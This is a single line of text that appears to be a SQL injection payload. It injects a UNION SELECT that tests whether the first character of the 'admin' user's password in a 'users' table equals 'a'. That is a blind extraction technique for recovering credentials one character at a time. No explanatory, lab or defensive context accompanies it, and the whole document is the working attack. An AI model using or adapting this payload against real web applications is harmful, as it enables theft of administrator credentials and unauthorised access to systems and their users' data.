' and 0 union select 1, 1, (select if(substring((select password from users where useraname = 'admin') , 1, 1) = 'a', 1, 0)) -- -
